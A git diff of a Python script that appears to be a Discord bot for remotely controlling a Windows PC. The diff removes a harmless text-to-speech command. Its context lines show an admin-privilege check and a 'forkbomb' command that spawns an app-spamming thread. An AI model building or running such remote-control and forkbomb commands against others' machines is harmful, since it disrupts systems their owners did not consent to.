@@ -38,7 +38,6 @@ import uuid
 import socket
 import cgi
 import win32com.client
-import pyttsx3
 
 def is_admin():
     """Check if the script is running with admin privileges."""
@@ -915,21 +914,6 @@ async def forkbomb(ctx):
     thread = threading.Thread(target=spam_apps)
     thread.daemon = True  # This allows the thread to exit when the main program exits
     thread.start()
-
-# Initialize pyttsx3 engine
-engine = pyttsx3.init()
-
-# .tts command that converts text to speech and plays it on your PC
-@bot.command(name="tts")
-async def tts(ctx, *, text: str):
-    if text:
-        # Use pyttsx3 to convert text to speech and play it locally on your PC
-        engine.say(text)
-        engine.runAndWait()
-        
-        await ctx.send(f"Playing TTS message: '{text}'")
-    else:
-        await ctx.send("Please provide a message to convert to speech.")
 
 @bot.command()
 async def remove(ctx):
